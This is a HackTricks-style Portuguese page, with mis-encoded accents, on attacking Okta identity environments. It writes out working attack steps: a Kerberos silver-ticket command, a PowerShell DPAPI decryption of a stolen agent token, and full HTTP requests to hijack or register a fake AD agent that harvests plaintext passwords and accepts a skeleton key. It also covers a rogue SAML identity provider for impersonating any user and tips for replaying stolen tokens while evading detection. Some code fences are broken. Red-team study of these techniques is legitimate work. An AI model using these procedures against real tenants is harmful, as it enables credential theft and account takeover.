# Seguran√ßa Okta

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

Okta, Inc. √© uma **empresa de gest√£o de identidade e acesso** que fornece software em nuvem para ajudar empresas a **gerenciar e proteger a autentica√ß√£o de usu√°rios em aplica√ß√µes modernas**, e para desenvolvedores incorporarem controles de identidade em aplica√ß√µes, servi√ßos web de sites e dispositivos.

Seu servi√ßo principal, chamado Okta Identity Cloud, oferece produtos que incluem single sign-on (SSO), autentica√ß√£o multifator (MFA), gerenciamento de ciclo de vida, diret√≥rio universal, gerenciamento de acesso a API e mais. Isso ajuda as empresas a protegerem seus dados sens√≠veis e tamb√©m a simplificar o acesso dos usu√°rios, tornando aplica√ß√µes e servi√ßos mais acess√≠veis e f√°ceis de usar para funcion√°rios ou clientes.

Os servi√ßos da Okta s√£o amplamente utilizados em contextos empresariais, bem como por empresas menores e desenvolvedores. Desempenha um papel crucial na habilita√ß√£o das empresas para adotarem e gerenciarem tecnologias em nuvem de forma segura. At√© o meu √∫ltimo conhecimento em setembro de 2021, Okta continua sendo um ator significativo na ind√∫stria de Gest√£o de Identidade e Acesso (IAM).

{% hint style="danger" %}
O principal objetivo da Okta √© configurar o acesso a diferentes usu√°rios e grupos para aplica√ß√µes externas. Se voc√™ conseguir **comprometer privil√©gios de administrador em um ambiente Okta**, voc√™ provavelmente ser√° capaz de **comprometer todas as outras plataformas que a empresa est√° usando**.
{% endhint %}

{% hint style="success" %}
Para realizar uma revis√£o de seguran√ßa de um ambiente Okta, voc√™ deve solicitar **acesso de administrador somente leitura**.
{% endhint %}

### Resumo

Existem **usu√°rios** (que podem ser **armazenados na Okta,** registrados a partir de **Provedores de Identidade** configurados ou autenticados via **Active Directory** ou LDAP).\
Esses usu√°rios podem estar dentro de **grupos**.\
Tamb√©m existem **autenticadores**: diferentes op√ß√µes para autentica√ß√£o como senha, e v√°rios 2FA como WebAuthn, email, telefone, okta verify (podem estar habilitados ou desabilitados)...

Ent√£o, existem **aplica√ß√µes** sincronizadas com a Okta. Cada aplica√ß√£o ter√° algum **mapeamento com a Okta** para compartilhar informa√ß√µes (como endere√ßos de email, primeiros nomes...). Al√©m disso, cada aplica√ß√£o deve estar dentro de uma **Pol√≠tica de Autentica√ß√£o**, que indica os **autenticadores necess√°rios** para um usu√°rio **acessar** a aplica√ß√£o.

{% hint style="danger" %}
O papel mais poderoso √© **Super Administrador**.

Se um atacante comprometer a Okta com acesso de Administrador, todas as **aplica√ß√µes confiando na Okta** provavelmente ser√£o **comprometidas**.
{% endhint %}

## Ataques

### Localizando o Portal Okta

Normalmente o portal de uma empresa estar√° localizado em **companyname.okta.com**. Se n√£o, tente **varia√ß√µes** simples do **companyname.** Se voc√™ n√£o conseguir encontr√°-lo, tamb√©m √© poss√≠vel que a organiza√ß√£o tenha um registro **CNAME** como **`okta.companyname.com`** apontando para o **portal Okta**.

### Login no Okta via Kerberos

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Se um dom√≠nio como **`companyname.kerberos.okta.com`** existir, ent√£o o kerberos est√° configurado dentro da empresa para acessar a Okta. Isso √© muito interessante, pois normalmente usu√°rios do Windows n√£o precisar√£o de MFA para acessar a Okta.

Tamb√©m √© poss√≠vel encontrar usu√°rios Kerberos configurados com acesso Okta dentro do ambiente AD executando:
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
Com um ticket recuperado para o usu√°rio AD, precisamos injet√°-lo em um host que controlamos usando Rubeus ou Mimikatz:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Voc√™ precisar√° garantir que `clientname.kerberos.okta.com` seja adicionado √† zona de seguran√ßa "Intranet" nas Op√ß√µes de Internet. E ent√£o, no nosso navegador, se acessarmos a URL abaixo, dever√≠amos receber uma resposta JSON fornecendo um resultado `OK` quando o ticket Kerberos for aceito:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Indo para o painel de controle da Okta, se tudo estiver OK, voc√™ ser√° autenticado.

Al√©m disso, se conseguirmos comprometer a pr√≥pria conta de servi√ßo da Okta expondo o SPN de delega√ß√£o, podemos realizar um ataque Silver Ticket.

Deve-se notar que, como a Okta suporta apenas AES para criptografia de ticket, precisaremos garantir que temos a chave AES ou a senha em texto claro para autenticar:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para criar nosso ticket para o usu√°rio v√≠tima `testuser`, usamos:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

E novamente, entregue isso para a Okta atrav√©s da nossa sess√£o do navegador:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Sequestro do Agente AD da Okta

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Se voc√™ acessar um servidor executando o Agente AD da Okta. Este agente √© respons√°vel por sincronizar usu√°rios e grupos do dom√≠nio com a Okta para provisionamento, e tamb√©m responder a solicita√ß√µes de autentica√ß√£o da Okta √† medida que os usu√°rios fazem login no portal.

Por padr√£o, o agente √© instalado em:
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
Vamos dar uma olhada no `OktaAgentService.exe.config`, que cont√©m alguns trechos interessantes de XML:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

O `AgentToken` codificado em Base64 √© onde focamos nossa aten√ß√£o. Se abrirmos o `OktaAgentService.exe` no dnSpy, podemos ver como esses valores s√£o descriptografados:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Isso mesmo... o bom e velho DPAPI! O valor `RandomEntropy` √© definido para um valor de:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Isso significa que podemos descriptografar esse valor XML codificado em Base64 usando:
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
A chave mestra DPAPI utilizada pertence √† conta de usu√°rio que executa o servi√ßo "Okta AD Agent", portanto, voc√™ precisar√° executar o acima no contexto da conta de servi√ßo ou obter a chave mestra para a conta e descriptografar:

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por exemplo, dentro de `OktaAgentService.exe.config` temos dois campos XML adicionais, `APPID` e `AGENTID`. Combinados com o `AgentToken`, podemos fazer uma solicita√ß√£o `GET` da seguinte forma:
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
Esta chamada ser√° bloqueada at√© que um usu√°rio se autentique no Okta (ou a solicita√ß√£o expire), caso em que retornar√° o pr√≥ximo nome de usu√°rio e senha fornecidos em texto claro:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
Enquanto isso permite capturar credenciais, tamb√©m temos a oportunidade de responder a essa tentativa de autentica√ß√£o se quisermos fazer algo como fornecer uma chave-mestra. Fazemos isso emitindo a seguinte solicita√ß√£o HTTP:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
O resultado de emitir esta solicita√ß√£o √© permitir autentica√ß√£o para qualquer usu√°rio via Okta.

### Sequestrando AD Como um Administrador

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Sabemos que podemos sequestrar um Agente AD Okta usando um Token de Agente roubado, mas e se tivermos comprometido uma conta Okta privilegiada e quisermos fazer isso sem um token de agente existente? Vamos ver como fazer isso.

Primeiro, precisamos criar um token de API de Agente AD Okta. Para iniciar o fluxo de autentica√ß√£o, precisamos de um C√≥digo OAuth. Para obt√™-lo, come√ßamos indo para:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
```markdown
{% endcode %}

Isso exibir√° um prompt de permiss√£o para voc√™ aceitar:

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aceitar o prompt apresentado resultar√° em um redirecionamento para `/oauth-response` junto com um par√¢metro `code`:

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Precisamos pegar esse par√¢metro `code` e solicitar um token de API usando a requisi√ß√£o POST:
```
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
A resposta nos retorna nosso token de API:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
Usando este token, precisamos associ√°-lo a um dom√≠nio AD ativo. Fazemos isso usando a chamada de API:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
Isso nos retornar√° a seguinte resposta XML, onde precisamos reter o valor do atributo `id` para mais tarde
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
Em seguida, fazemos uma chamada de API HTTP para nomear nosso conector:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
```xml
<user id="00u5t60iloOHN9pBi0h7">
    <!-- Outros elementos XML omitidos para brevidade -->
</user>
```
{% endcode %}

Este comando retornar√° uma resposta XML onde, novamente, precisamos reter o atributo `id`:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```markdown
{% endcode %}

Finalmente, inicializamos a conex√£o para permitir o recebimento de dados:
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
Com isso feito, nosso falso agente AD est√° agora pronto e processar√° tentativas de autentica√ß√£o como mostrado anteriormente.

Agora, obviamente, n√£o queremos estar fazendo tudo isso usando o Burp, ent√£o uma ferramenta foi criada para suportar alguns casos de uso. Ela est√° dispon√≠vel [aqui](https://github.com/xpn/OktaPostExToolkit).

O primeiro modo que podemos executar esta ferramenta √© no modo `token`, que pega um valor de Token de Agente comprometido e se conectar√° √† API do Okta, despejando quaisquer credenciais que receber:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
Exemplos de v√≠deo:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

A ferramenta tamb√©m permite registrar um novo conector AD se tivermos credenciais administrativas dispon√≠veis para um usu√°rio Okta que esteja utilizando:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Provedor Falso de SAML da Okta

(Ataque copiado [**daqui**](https://trustedsec.com/blog/okta-for-red-teamers)).

Outra t√©cnica que tem sido muito √∫til durante avalia√ß√µes √© a implanta√ß√£o de um provedor falso de SAML.

Recentemente, a Okta realmente forneceu [uma atualiza√ß√£o de seguran√ßa](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) sobre ataques em ambiente real usando essa t√©cnica, ent√£o √© certamente √∫til saber sobre isso ao simular atividades em um ambiente, especialmente para clientes que gostariam de testar suas detec√ß√µes desse ataque espec√≠fico.

Se tivermos acesso a uma conta Okta elevada, podemos implantar um Provedor de Identidade externo como parte da funcionalidade da Okta. Isso permite que provedores externos como o Entra ID completem a autentica√ß√£o antes de redirecionar o usu√°rio para a Okta para selecionar aplicativos integrados.

Mas o que acontece se controlarmos o IDP? Bem, √© l√≥gico que, neste caso, podemos aprovar qualquer solicita√ß√£o de autentica√ß√£o que quisermos.

Para testar isso, precisamos de um Provedor de Identidade personalizado para implantar. Um IDP SAML muito prec√°rio que suporta nossas atividades nefastas pode ser encontrado [aqui](https://github.com/xpn/OktaPostExToolkit). A ideia central por tr√°s dessa ferramenta √© nos permitir emitir respostas de autentica√ß√£o SAML assinadas que correspondam a qualquer usu√°rio que desejarmos.

Este servidor escutar√° solicita√ß√µes HTTP recebidas em `/saml`, ent√£o primeiro precisamos implantar um IDP na Okta.

Primeiro, selecionamos o IDP SAML 2.0:

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ao configurar o IDP, precisamos prestar aten√ß√£o em algumas configura√ß√µes. A primeira √© o `Name`, que √© o nome amig√°vel a ser mostrado a quaisquer outros administradores da Okta.

A seguir est√° a URL do emissor, que deve ser definida para o valor de um identificador no formato URI. Isso novamente pode ser qualquer coisa, mas usaremos `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Tamb√©m precisamos definir o campo `IdP Single Sign-On URL` para o local onde nosso servidor SAML est√° em execu√ß√£o. Agora, a coisa interessante √© que isso N√ÉO precisa ser uma URL que aponte para o nosso servidor. Sinto que vale a pena apontar isso porque podemos ser bastante criativos na URL que inserimos aqui e tornar o trabalho da Equipe Azul um pouco mais dif√≠cil. Por exemplo, podemos definir esse campo para algo como `https://idp.google.com/saml` se quisermos, e a √∫nica coisa que precisamos ser capazes de fazer √© capturar a solicita√ß√£o SAML de entrada. Aqui est√° a coisa interessante: a solicita√ß√£o SAML √© encaminhada pelo lado do cliente. Por isso, quero dizer que a Okta gerar√° a `AuthRequest` SAML e far√° nosso navegador redirecionar para `https://idp.google.com/` junto com a solicita√ß√£o SAML. Isso, claro, significa que podemos simplesmente modificar o arquivo de hosts local para apontar `idp.google.com` para `127.0.0.1`:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
Tamb√©m precisamos de um certificado de assinatura que controlamos. Este pode ser autoassinado e gerado usando OpenSSL com:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Novamente, voc√™ pode ser criativo com isso, pois n√£o h√° requisitos espec√≠ficos em torno da autenticidade deste certificado.

Uma vez que a chave √© gerada, basta fazer o upload do certificado para o Okta e criar nosso IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Finalmente, precisamos garantir que `Match Against` esteja configurado para `Okta Username or Email` e `Account Link Policy` esteja configurado para `Automatic` para nos permitir autenticar em contas Okta existentes:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Com tudo salvo, precisamos baixar os Metadados:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Ent√£o, para iniciar a solicita√ß√£o de autentica√ß√£o e emitir o `AuthRequest`, navegamos para a URL mostrada em `Assertion Consumer Service URL`:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Navegar para esta URL resulta em um redirecionamento para nosso servidor SAML interno:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Se fornecermos um endere√ßo de e-mail, descobrimos que podemos nos autenticar como qualquer usu√°rio do Okta sem precisar conhecer suas credenciais.

Vamos ver isso em a√ß√£o em [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing do Portal Okta com Evilgnix

Neste [**post do blog**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) √© explicado como preparar uma campanha de phishing contra um portal Okta.

### Ataque de Impersona√ß√£o de Colega

Os **atributos que cada usu√°rio pode ter e modificar** (como e-mail ou primeiro nome) podem ser configurados no Okta. Se uma **aplica√ß√£o** est√° **confiando** em um **atributo** que o usu√°rio pode **modificar**, ele poder√° **impersonar outros usu√°rios naquela plataforma**.

Portanto, se o aplicativo est√° confiando no campo **`userName`**, provavelmente voc√™ n√£o poder√° alter√°-lo (porque geralmente n√£o √© poss√≠vel alterar esse campo), mas se est√° confiando, por exemplo, em **`primaryEmail`**, voc√™ poder√° **alter√°-lo para o endere√ßo de e-mail de um colega** e imperson√°-lo (voc√™ precisar√° ter acesso ao e-mail e aceitar a mudan√ßa).

Note que esta impersona√ß√£o depende de como cada aplicativo foi configurado. Apenas os que confiam no campo que voc√™ modificou e aceitam atualiza√ß√µes ser√£o comprometidos.\
Portanto, o aplicativo deve ter este campo habilitado se ele existir:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Tamb√©m vi outros aplicativos que eram vulner√°veis, mas n√£o tinham esse campo nas configura√ß√µes do Okta (no final, diferentes aplicativos s√£o configurados de maneira diferente).

A melhor maneira de descobrir se voc√™ poderia impersonar algu√©m em cada aplicativo seria tentar!

## Evitando pol√≠ticas de detec√ß√£o comportamental <a href="#9fde" id="9fde"></a>

A menos que tenha sido divulgado antecipadamente, voc√™ provavelmente n√£o saber√° se as pol√≠ticas de detec√ß√£o comportamental foram implementadas at√© encontr√°-las. Uma **maneira potencial de contornar as pol√≠ticas de detec√ß√£o comportamental do Okta** √© simplesmente **evitar o painel principal do Okta** completamente e direcionar diretamente para os aplicativos Okta (seriam os aplicativos na captura de tela acima que est√£o obscurecidos por caixas vermelhas). Se voc√™ estiver em posse de um token de acesso Okta, em vez de reproduzir o token na p√°gina principal de login do Okta da empresa alvo, voc√™ reproduziria o token na URL espec√≠fica do aplicativo Okta.

Outras recomenda√ß√µes s√£o:

* Tenha cuidado ao reproduzir tokens de acesso capturados de proxies anonimizadores populares e servi√ßos de VPN.
* Ao reproduzir um token de acesso, use a mesma string de agente do usu√°rio usada pelo cliente.
* Tenha cuidado ao reproduzir tokens de acesso capturados de usu√°rios separados do mesmo endere√ßo IP.
* Tenha cuidado ao reproduzir tokens de acesso contra o painel do Okta.
* Se voc√™ conhece os endere√ßos IP das empresas que as v√≠timas estar√£o usando, considere bloquear todo o tr√°fego que n√£o seja desse IP ou faixa de IP.

## Fortalecimento do Okta

O Okta possui muitas configura√ß√µes poss√≠veis, nesta p√°gina voc√™ encontrar√° como revis√°-las para que sejam o mais seguras poss√≠vel:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
